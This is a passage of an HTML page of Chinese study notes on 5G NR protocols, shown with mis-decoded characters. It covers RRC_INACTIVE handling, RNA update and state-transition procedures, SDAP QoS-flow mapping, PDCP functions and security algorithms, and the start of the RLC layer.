Releaseæµç¨‹é‡Šæ”¾UEçš„N2å£è¿æ¥ï¼Œå°†UEçš„CMçŠ¶æ€è¿ç§»åˆ°<code>CM_IDLE</code>çŠ¶æ€ã€‚</li><li>å¦‚æœNG-RANä»…ä»…åªæœ‰ç”¨æˆ·é¢æ•°æ®è¦å‘é€ç»™UEï¼Œåˆ™NG-RANèŠ‚ç‚¹å¯ä»¥ç»§ç»­ä¿ç•™N2è¿æ¥æˆ–è€…å‘èµ·AN Releaseæµç¨‹é‡Šæ”¾N2å£è¿æ¥ï¼Œå¦‚ä½•é€‰æ‹©å–å†³äºNG-RANçš„æœ¬åœ°é…ç½®ã€‚</li><li>æ³¨ï¼šåœ¨RANå¯»å‘¼å¤±è´¥æ—¶è§¦å‘RANå¯»å‘¼çš„ç”¨æˆ·é¢æ•°æ®åŒ…å¯èƒ½ä¼šä¸¢å¤±ã€‚</li></ul><p>â— AMFç»™NG-RANæä¾›RRC Inactive Assistance Informationï¼Œä»¥ä¾›NG-RANç”¨äºå†³å®šUEæ˜¯å¦å¯ä»¥è¿›å…¥RRC_INACTIVEçŠ¶æ€ï¼›è¿™ä¸ªRRC Inactive Assistance Informationä¿¡æ¯åŒ…æ‹¬ï¼šé…ç½®ç»™UEçš„æ³¨å†ŒåŒºã€UEç‰¹å®šçš„DRXã€å‘¨æœŸæ³¨å†Œå®šæ—¶å™¨ã€MICOæŒ‡ç¤ºã€UE id indexå€¼ç­‰ã€‚</p><img src="https://i.loli.net/2021/11/14/kMRCdfLJvlO2pIe.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/kMRCdfLJvlO2pIe.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p><strong>â— RNAæ›´æ–°æµç¨‹</strong></p><p>â— UEè§¦å‘çš„RNAæ›´æ–°è¿‡ç¨‹ï¼ŒåŒ…æ‹¬åœ¨Xnæ¥å£ä¸Šçš„ä¸Šä¸‹æ–‡æ£€ç´¢ã€‚è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šåœ¨UEç§»åŠ¨å‡ºæ‰€é…ç½®çš„RNAæ—¶è§¦å‘ï¼Œæˆ–è€…å‘¨æœŸæ€§åœ°è§¦å‘ã€‚</p><img src="https://i.loli.net/2021/11/14/cHwmlfnW7o9DGyO.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/cHwmlfnW7o9DGyO.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ol><li><p>UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAæ›´æ–°ã€‚</p></li><li><p>å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚</p></li><li><p>æœ€åæœåŠ¡çš„gNBå¯ä»¥æä¾›UEä¸Šä¸‹æ–‡(å¦‚ä¸‹æ‰€è¿°)ã€‚å¦å¤–,æœ€åæœåŠ¡gNBå¯èƒ½å†³å®šæŠŠé—®é¢˜è½¬ç§»åˆ°RRC_IDLE(ä¸”ç¨‹åºéµå¾ªæ­¥éª¤3å’Œå›¾9.2.2.5-3ä¹‹å),æˆ–è€…å¦‚æœé—®é¢˜ä»åœ¨å‰é¢é…ç½®çš„RNA,ä½¿é—®é¢˜è¿‡å»æœåŠ¡ä¸Šä¸‹æ–‡gNBå’Œä¿æŒé—®é¢˜RRC_INACTIVE(ä¸”ç¨‹åºéµå¾ªæ­¥éª¤3å’Œå›¾9.2.2.5-2ä¹‹å)ã€‚</p></li><li><p>gNBå¯ä»¥å°†UEè½¬ç§»åˆ°RRC_CONNECTEDçŠ¶æ€ï¼Œæˆ–è€…ä½¿UEé‡å›RRC_IDLEæ€(è¿™ç§æƒ…å†µä¸‹ï¼ŒgNBå‘é€ä¸€æ¡RRCReleaseæ¶ˆæ¯)ï¼Œæˆ–è€…ä½¿UEè¿”å›RRC_INACTIVEï¼Œå¦‚ä¸‹å‡å®šã€‚</p></li><li><p>å¦‚æœè¦é˜²æ­¢åœ¨æœ€åæœåŠ¡gNBä¸­ç¼“å†²çš„ä¸‹è¡Œç”¨æˆ·æ•°æ®çš„ä¸¢å¤±ï¼Œåˆ™æ¥å…¥çš„gNBç»™æœ€åæœåŠ¡gNBæä¾›ä¸‹è¡Œæ•°æ®è½¬å‘åœ°å€</p></li></ol><p>6/7. gNBè¿›è¡Œè·¯å¾„åˆ‡æ¢ï¼ˆå‘æœåŠ¡AMFå‘è·¯å¾„åˆ‡æ¢è¯·æ±‚æ¶ˆæ¯ï¼ŒAMFå›å¤è·¯å¾„åˆ‡æ¢å“åº”æ¶ˆæ¯ ï¼‰</p><ol start="8"><li><p>gNBé€šè¿‡å‘é€å¸¦æœ‰æŒ‚èµ·æŒ‡ç¤ºçš„RRCReleaseæ¥ä½¿ç»ˆç«¯å¤„äºRRC_INACTIVEçŠ¶æ€</p></li><li><p>é€šçŸ¥æœ€åæœåŠ¡çš„gNBé‡Šæ”¾UEä¸Šä¸‹æ–‡</p></li></ol><p>â— å½“UEä»ç„¶åœ¨æ‰€é…ç½®çš„RNAï¼Œå¹¶ä¸”æœ€åæœåŠ¡çš„gNBåˆ¤å®šä¸é‡æ–°å®šä½UEä¸Šä¸‹æ–‡ï¼Œå¹¶ä¿æŒUEåœ¨RRC_INACTIVEçš„æƒ…å†µä¸‹çš„RNAæ›´æ–°è¿‡ç¨‹</p><img src="https://i.loli.net/2021/11/14/c2uj8FfXP5VYEIa.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/c2uj8FfXP5VYEIa.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ol><li><p>UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAæ›´æ–°ã€‚</p></li><li><p>å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚</p></li><li><p>æœ€åæä¾›æœåŠ¡çš„gNBå­˜å‚¨æ¥æ”¶åˆ°çš„ç”¨äºä¸‹æ¬¡å°è¯•æ¢å¤çš„æ¶ˆæ¯(ä¾‹å¦‚ä¸è¦æ¢å¤å°åŒºç›¸å…³çš„C-RNTIå’ŒPCI)ï¼Œå¹¶ä»¥æ£€ç´¢UEä¸Šä¸‹æ–‡å¤±è´¥æ¶ˆæ¯(åŒ…æ‹¬å°è£…çš„RRCReleaseæ¶ˆæ¯)å“åº”gNBã€‚RRCReleaseæ¶ˆæ¯åŒ…æ‹¬æš‚åœæŒ‡ç¤ºã€‚</p></li><li><p>gNBå°†RRCReleaseæ¶ˆæ¯è½¬å‘åˆ°UEã€‚</p></li></ol><p>â— å½“æœ€åæœåŠ¡çš„gNBå†³å®šç§»åŠ¨ç»ˆç«¯åˆ°RRC_IDLEçš„æƒ…å†µä¸‹çš„RNAæ›´æ–°è¿‡ç¨‹</p><img src="https://i.loli.net/2021/11/14/uaZvcOkXbV87UeP.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/uaZvcOkXbV87UeP.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><ol><li><p>UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAåŸŸæ›´æ–°ã€‚</p></li><li><p>å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚</p></li><li><p>æœ€åæœåŠ¡çš„gNBæä¾›ä¸€æ¡<code>RRC Release</code>æ¶ˆæ¯ï¼Œä½¿UEè½¬æ¢åˆ°<code>RRC_IDLE</code>çŠ¶æ€ï¼Œè€Œä¸æä¾›UEä¸Šä¸‹æ–‡ã€‚</p></li><li><p>æœ€åæœåŠ¡çš„gNBåˆ é™¤UEä¸Šä¸‹æ–‡ã€‚</p></li><li><p>gNBå‘é€<code>RRC Release</code>æ¶ˆæ¯ï¼Œè§¦å‘è½¬æ¢åˆ°<code>RRC_IDLE</code>çŠ¶æ€ã€‚</p></li></ol><h3 id="ï¼ˆå››ï¼‰ã€çŠ¶æ€è½¬æ¢">ï¼ˆå››ï¼‰ã€çŠ¶æ€è½¬æ¢</h3><img src="https://i.loli.net/2021/11/14/VQKGCBf2UaLFRgn.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/VQKGCBf2UaLFRgn.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><img src="https://i.loli.net/2021/11/14/P8NBAeqZpkmSXKd.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/P8NBAeqZpkmSXKd.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>RRC_CONNECTED å’Œ RRC_INACTIVEå¯ä»¥äº’ç›¸è½¬æ¢ ï¼›RRC_CONNECTED å’Œ RRC_IDLEå¯ä»¥äº’ç›¸è½¬æ¢ ï¼›RRC_INACTIVE åªèƒ½å•å‘é‡Šæ”¾èµ„æºè½¬æ¢åˆ°RRC_IDLE</p><p>å‚è€ƒï¼šTS38.300ã€TS38.331</p><p><strong>â— RRC_CONNECTED to RRC_INACTIVE</strong></p><ul><li>é€šè¿‡å®šæ—¶å™¨è¶…æ—¶è§¦å‘ï¼ˆT380ï¼‰</li></ul><p><strong>â— RRC_INACTIVE to RRC_IDLE</strong></p><ul><li>é€šè¿‡å®šæ—¶å™¨è¶…æ—¶è§¦å‘ï¼ˆä¸€èˆ¬æ˜¯1500sï¼‰</li></ul><p><strong>â— RRC_INACTIVE to RRC_CONNECTED</strong></p><ul><li>UEå‘èµ·ï¼šUEä¸Šä¸‹æ–‡æ£€ç´¢æˆåŠŸçŠ¶æ€ä¸‹ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢</li></ul><img src="https://i.loli.net/2021/11/14/SdionFX7mwygaUx.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/SdionFX7mwygaUx.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>1.UEä»RRC_INACTIVEæ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡gNBåˆ†é…çš„I-RNTI</p><p>2.å¦‚æœèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBèº«ä»½ï¼Œåˆ™gNBè¯·æ±‚æœ€åæœåŠ¡gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ®</p><p>3.æœ€åæœåŠ¡gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ®</p><p>4/5.gNBå®ŒæˆRRCè¿æ¥çš„æ¢å¤ æ³¨æ„:å¦‚æœæˆæƒå…è®¸ï¼Œç”¨æˆ·æ•°æ®ä¹Ÿå¯ä»¥åœ¨æ­¥éª¤5ä¸­å‘é€</p><p>6.å¦‚æœè¦é˜²æ­¢åœ¨æœ€åæœåŠ¡gNBä¸­ç¼“å†²çš„ä¸‹è¡Œç”¨æˆ·æ•°æ®çš„ä¸¢å¤±ï¼Œåˆ™æ¥å…¥çš„gNBç»™æœ€åæœåŠ¡gNBæä¾›ä¸‹è¡Œæ•°æ®è½¬å‘åœ°å€</p><p>7/8.gNBæ‰§è¡Œè·¯å¾„åˆ‡æ¢ï¼ˆå‘æœåŠ¡AMFå‘è·¯å¾„åˆ‡æ¢è¯·æ±‚æ¶ˆæ¯,AMFå›å¤è·¯å¾„åˆ‡æ¢å“åº”æ¶ˆæ¯ ï¼‰</p><p>9.é€šçŸ¥æœ€åæœåŠ¡gNBé‡Šæ”¾UEçš„èµ„æº</p><ul><li>UEå‘èµ·ï¼šUEä¸Šä¸‹æ–‡æ£€ç´¢å¤±è´¥çŠ¶æ€ä¸‹ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢</li></ul><img src="https://i.loli.net/2021/11/14/PeLjvI8ABYkCbx2.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/PeLjvI8ABYkCbx2.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>\1. UEä»RRC_INACTIVEæ¢å¤ï¼Œæä¾›I-RNTIï¼Œç”±æœ€åæœåŠ¡çš„gNBåˆ†é…ã€‚</p><p>\2. å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œå°±è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ®ã€‚</p><p>\3. æœ€åä¸€ä¸ªæœåŠ¡çš„gNBæ— æ³•æ£€ç´¢æˆ–éªŒè¯ç»ˆç«¯ä¸Šä¸‹æ–‡æ•°æ®ã€‚</p><p>\4. æœ€åä¸€æ¬¡æœåŠ¡çš„gNBå‘gNBè¿”å›å¤±è´¥ä¿¡æ¯ã€‚</p><p>\5. gNBæ‰§è¡Œå›é€€ï¼Œé€šè¿‡å‘é€RRCSetupæ¥å»ºç«‹æ–°çš„RRCè¿æ¥ã€‚</p><p>\6. å»ºç«‹æ–°çš„RRC Connectionã€‚</p><ul><li>ç½‘ç»œæ‹’ç»ï¼šç»ˆç«¯è¯•å›¾ä»RRC_INACTIVEæ¢å¤è¿æ¥æ—¶ï¼Œç½‘ç»œæ‹’ç»çš„æƒ…å†µ</li></ul><img src="https://i.loli.net/2021/11/14/tUuMLKYxcp3I8jd.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/tUuMLKYxcp3I8jd.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>\1. UEå°è¯•ä»RRC_INACTIVEæ¢å¤è¿æ¥ã€‚</p><p>\2. gNBæ— æ³•å¤„ç†è¿™ä¸ªæµç¨‹ï¼Œä¾‹å¦‚ç”±äºæ‹¥å¡ã€‚</p><p>\3. gNBå‘é€RRCReject(å¸¦æœ‰ç­‰å¾…æ—¶é—´ä¿¡æ¯)æ¥ä¿æŒUEå¤„äºRRC_INACTIVEçŠ¶æ€ã€‚</p><ul><li>ç½‘ç»œå‘èµ·ï¼šç½‘ç»œè§¦å‘çš„ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢</li></ul><img src="https://i.loli.net/2021/11/14/BcAlbu4EvXhxzpC.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/BcAlbu4EvXhxzpC.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>1.å‘ç”ŸRANå¯»å‘¼è§¦å‘äº‹ä»¶ï¼ˆæ”¶åˆ°ä¸‹è¡Œç”¨æˆ·é¢æ•°æ®ï¼Œæ¥è‡ª5GCçš„ä¸‹è¡Œä¿¡ä»¤ç­‰ï¼‰ 2.è§¦å‘RANå¯»å‘¼ï¼Œå¯»å‘¼èŒƒå›´æ˜¯RNA 3.ä½¿ç”¨ I-RNTIå¯»å‘¼UE 4.å¦‚æœUEè¢«å¯»å‘¼åˆ°ï¼Œåˆ™åç»­æµç¨‹åŒä¸Šé¢çš„â€œUEå‘èµ·ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢â€</p></div><h2 id="ä¸‰ã€SDAPå±‚">ä¸‰ã€SDAPå±‚</h2><div class="story post-story"><img src="https://i.loli.net/2021/11/14/Hh2oEWj91NTf6Z5.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/Hh2oEWj91NTf6Z5.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>(Service Data Adaptation Protocol,æœåŠ¡æ•°æ®é€‚é…åè®®å±‚)å±äºå±‚äºŒï¼Œåªå­˜åœ¨äºç”¨æˆ·é¢ï¼Œä½äºPDCPå±‚ä»¥ä¸Šï¼Œç›´æ¥æ‰¿è½½IPæ•°æ®åŒ…ã€‚ è´Ÿè´£QoSæµä¸DRBï¼ˆæ•°æ®æ— çº¿æ‰¿è½½ï¼‰ä¹‹é—´çš„æ˜ å°„ ä¸ºæ•°æ®åŒ…æ·»åŠ QFIï¼ˆQoS flow IDï¼‰æ ‡è¯†</p><h3 id="ï¼ˆä¸€ï¼‰ã€æ‰¿è½½">ï¼ˆä¸€ï¼‰ã€æ‰¿è½½</h3><p>â— <strong>4GåŸºäºEPSæ‰¿è½½</strong></p><img src="https://i.loli.net/2021/11/14/ngH8aIpAdNJus96.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/ngH8aIpAdNJus96.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>â— ç‰¹ç‚¹ï¼š</p><ul><li>QoSæ§åˆ¶çš„åŸºæœ¬ç²’åº¦æ˜¯EPSæ‰¿è½½(Bearer)ï¼›</li><li>éœ€è¦é€šè¿‡å»ºç«‹å¤šä¸ªä¸“ç”¨æ‰¿è½½ä¸ºUEæä¾›å…·æœ‰ä¸åŒQoSä¿éšœçš„ä¸šåŠ¡ã€‚</li></ul><p>â— å±€é™ï¼š</p><ul><li>LTE QoSæœºåˆ¶æ›´é€‚ç”¨äºè¿è¥å•†å†…éƒ¨åº”ç”¨ï¼›</li><li>åŸºäºæ‰¿è½½çš„QoSç®¡ç†æœºåˆ¶ç²’åº¦è¾ƒç²—ï¼Œæ— æ³•å®ç°ä¸šåŠ¡æµç²’åº¦çš„QoSæ§åˆ¶ï¼›</li><li>æ‰¿è½½å»ºç«‹ä¿¡ä»¤å¼€é”€å¤§ã€è¾ƒæ…¢ï¼Œæ— æ³•è·Ÿè¸ªTCP sessionå˜åŒ–ã€‚</li></ul><p><strong>â— 5Gæ‰¿è½½åŸºäºQoSæ¶æ„ï¼š</strong></p><img src="https://i.loli.net/2021/11/14/f7Embo1usU2yLgl.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/f7Embo1usU2yLgl.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>5GCä¼šä¸ºæ¯ä¸ªUEå»ºç«‹ä¸€ä¸ªæˆ–å¤šä¸ªPDUï¼ˆåè®®æ•°æ®å•å…ƒï¼‰ä¼šè¯ï¼ˆPDU sessionï¼‰ï¼ŒPDUä¼šè¯å¯èƒ½ä¼šå»ºç«‹ä¸€ä¸ªæˆ–å¤šä¸ªQoSæµï¼ŒNG-RANä¼šä¸ºæ‹¥æœ‰ä¸åŒéœ€æ±‚çš„QoSæµå»ºç«‹ä¸åŒçš„DRBï¼Œæˆ–å°†å±äºåŒä¸€PDUä¼šè¯çš„å¤šä¸ªQoSæµæ˜ å°„åˆ°åŒä¸€ä¸ªDRBä¸Š</p><p>â— 5G QoSæ¨¡å‹åŸºäºQoSæµï¼ŒQoSæµæ˜¯PDUä¼šè¯å†…åŒºåˆ†QoSå·®å¼‚çš„æœ€ä½³ç²’åº¦ï¼Œå¹¶ä¸”ç”±QoSæµIDï¼ˆQFIï¼‰å”¯ä¸€æ ‡è®°ï¼Œæ¯ä¸ªQoSæµéƒ½æŠŠå…¶ç›¸å…³è”çš„QoSå±æ€§è¿›è¡Œé›†åˆã€‚</p><p>â— ä¸€ä¸ªQoSè§„åˆ™åŒ…å«ï¼šå…³è”çš„QoSæµçš„QFIã€æ•°æ®åŒ…è¿‡æ»¤å™¨é›†ï¼ˆä¸€ä¸ªè¿‡æ»¤å™¨åˆ—è¡¨ï¼‰ã€ä¼˜å…ˆçº§ã€‚ä¸€ä¸ªQoSæµå¯ä»¥æœ‰å¤šä¸ªQoSè§„åˆ™ã€‚</p><p>â— UEå’ŒUPFï¼ˆç”¨æˆ·å¹³é¢åŠŸèƒ½ï¼‰é€šè¿‡Packet Filter Setå°†ä¸šåŠ¡å’ŒQoSæµå…³è”ï¼ŒRANä¾§å°†QoSæµæ˜ å°„åˆ°DRBä¸Šï¼Œæ¥ç¡®ä¿æœåŠ¡çš„è´¨é‡</p><p>â— 5G QoS æ¶æ„åªç”¨äºSAç»„ç½‘</p><p>â— ä¸€ä¸ªQoSæµçš„QoSé…ç½®åŒ…å«çš„QoSå‚æ•°å¦‚ä¸‹ï¼š</p><ul><li>æ¯æ¡GBR QoSæµçš„QoSé…ç½®å¯èƒ½è¿˜ä¼šåŒ…å«ï¼šæŒ‡ç¤ºæ§åˆ¶ã€æœ€å¤§ä¸¢åŒ…ç‡ã€‚</li><li>æ¯æ¡GBR QoSæµçš„QoSé…ç½®è¿˜ä¼šåŒ…å«å‚æ•°ï¼šä¿è¯æµæ¯”ç‰¹ç‡(GFBR)ã€æœ€å¤§æµæ¯”ç‰¹ç‡(MFBR)ã€AMBRï¼ˆAggregate Maximum Bit Rateï¼Œç”¨æ¥é’³åˆ¶Non GBRæ€»å¸¦å®½ï¼‰ã€‚</li><li>æ¯æ¡Non-GBR QoSæµçš„QoSé…ç½®å¯èƒ½è¿˜ä¼šåŒ…å«å‚æ•°ï¼šåå°„QoSå±æ€§ï¼ˆRQAï¼‰ã€‚</li><li>æ¯æ¡QoSæµçš„QoSé…ç½®éƒ½ä¼šåŒ…å«çš„QoSå‚æ•°ï¼š5QIï¼ˆå®šä¹‰QoSç­‰çº§ï¼šæ—¶å»¶ã€è¯¯å—ã€ä¼˜å…ˆçº§ï¼‰ã€ARPã€‚</li></ul><h3 id="ï¼ˆäºŒï¼‰ã€SDAPå±‚å¤„ç†æµç¨‹">ï¼ˆäºŒï¼‰ã€SDAPå±‚å¤„ç†æµç¨‹</h3><img src="https://i.loli.net/2021/11/14/OGUKEqCp8AZbF6S.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/OGUKEqCp8AZbF6S.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>æ˜¯å¦æ·»åŠ SDAPå¤´å–å†³äºUEä¸Šè¡Œçš„QoSæµçš„æ˜ å°„æ–¹æ³•ï¼Œå¦‚æœé‡‡ç”¨åå°„å¼æ˜ å°„ï¼Œåˆ™gNBå¿…é¡»æ·»åŠ SDAPå¤´ï¼Œç”¨äºæ ‡è¯†è¯¥æ•°æ®åŒ…çš„QoSæµã€‚è‹¥æœé‡‡ç”¨åŸºäºé…ç½®çš„æ˜ å°„ï¼Œåˆ™gNBæ— éœ€æ·»åŠ SDAPåŒ…å¤´</p></div><h2 id="å››ã€PDCPå±‚">å››ã€PDCPå±‚</h2><div class="story post-story"><img src="https://i.loli.net/2021/11/14/nABFrEvIdRgMSO1.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/nABFrEvIdRgMSO1.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>æ•°æ®åˆ†æµçš„èŠ‚ç‚¹ï¼›Cloud RANä¸­CU,DUåˆ†ç¦»çš„èŠ‚ç‚¹</p><h3 id="ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½-2">ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½</h3><p>â— <strong>LTEåŸæœ‰</strong></p><ul><li>ä¼ è¾“ç”¨æˆ·é¢å’Œæ§åˆ¶é¢æ•°æ®</li><li>ç»´æŠ¤PDCPçš„SNå·</li><li>åŠ å¯†/è§£å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆ5Gï¼šç”¨æˆ·é¢å’Œæ§åˆ¶é¢ï¼›4Gï¼šä»…æ§åˆ¶é¢ ï¼‰</li><li>é‡å¤ä¸¢å¼ƒ</li><li>RoHCå¤´å‹ç¼©ï¼ˆç”¨æˆ·é¢ï¼Œéœ€åŸºç«™å’ŒUEå‡æ”¯æŒï¼‰</li></ul><p><strong>â— NRæ–°å¢</strong></p><ul><li>è·¯ç”±å’Œé‡å¤ï¼ˆåŒè¿æ¥åœºæ™¯æ—¶ï¼‰</li><li>é‡æ’åºï¼ˆä»RLCå±‚ç§»è‡³PDCPå±‚ï¼‰</li><li>æ”¯æŒä¹±åºé€’äº¤</li></ul><h3 id="ï¼ˆäºŒï¼‰ã€å‚æ•°">ï¼ˆäºŒï¼‰ã€å‚æ•°</h3><p>â— åœ¨RoHCçš„æ¡†æ¶ä¸‹ï¼Œé’ˆå¯¹ä¸åŒåè®®çš„æ•°æ®æµï¼Œæœ‰ä¸åŒçš„å¤´éƒ¨å‹ç¼©ç®—æ³•ã€‚5G RFCå®šä¹‰äº†å¦‚ä¸‹ä¸€äº›Profileç”¨äºRoHCå‹ç¼©</p><img src="https://i.loli.net/2021/11/14/WL4zAnrNESuC2FX.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/WL4zAnrNESuC2FX.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>â— RoHCï¼ˆRObust Header Compression)æ˜¯ä¸€ç§ä¸“ä¸ºæ— é™è¿è·¯è®¾è®¡çš„æ•°æ®åŒ…å¤´å‹ç¼©æœºåˆ¶ï¼Œä»¥é€‚åº”æ— çº¿é“¾è·¯é«˜è¯¯ç ç‡å’Œé•¿ç¯å›æ—¶é—´çš„é“¾è·¯ç‰¹æ€§ã€‚</p><ul><li>å¯é æ€§é«˜ï¼šç”±äºRoHCæä¾›äº†åé¦ˆæœºåˆ¶ï¼Œå› æ­¤å®ƒåœ¨é«˜è¯¯ç é«˜æ—¶å»¶ä¸œæ— çº¿é“¾è·¯ä¸­å…·æœ‰æ›´é«˜çš„å¯é æ€§</li><li>å‹ç¼©æ•ˆç‡é«˜ï¼šæœ€å°å¯å°†åŒ…å¤´å‹ç¼©æˆ1ä¸ªå­—èŠ‚</li></ul><p>â— å®‰å…¨æµç¨‹ç®—æ³•</p><ul><li>NIA0/NEA0ï¼šä¸è¿›è¡Œå®Œæ•´æ€§ä¿æŠ¤</li><li>128-NIA1/NEA1ï¼š128-bit SNOW 3G æ¬§æ´²</li><li>128-NIA2/NEA2ï¼š128-bit AES ç¾å›½</li><li>128-NIA3/NEA3ï¼š128-bit ZUC ä¸­å›½</li></ul></div><h2 id="äº”ã€RLCå±‚">äº”ã€RLCå±‚</h2><div class="story post-story"><img src="https://i.loli.net/2021/11/14/gTVfkPKvwseiZdz.jpg" class="lazyload" data-srcset="https://i.loli.net/2021/11/14/gTVfkPKvwseiZdz.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img" style="zoom:150%;" /><p>ä½äºPDCPå±‚ä»¥ä¸‹ å®ä½“åˆ†ä¸ºTMå®ä½“ã€UMå®ä½“ã€AMå®ä½“ï¼ŒAMæ•°æ®æ”¶å‘å…±ç”¨ä¸€ä¸ªå®ä½“ï¼ŒUMå’ŒTMæ”¶å‘å®ä½“åˆ†å¼€ ä¸åŒäºLTEï¼ŒNR RLCå±‚ç»„è£…RLCå±‚PDUæ—¶ï¼Œä¸éœ€è¦åº•å±‚MACé€šçŸ¥æ˜¯å¦æœ‰å‘é€æœºä¼šï¼Œå¯å…ˆè¡Œå°è£…PDUåŒ…ï¼ŒRLCä¹Ÿæ²¡æœ‰ä¸²è”åŠŸèƒ½ï¼ˆä¸‹ç§»åˆ°MACå±‚ï¼‰ï¼Œä½†RLC PDUè¦çœŸæ­£å‘é€å‡ºå»åŒæ 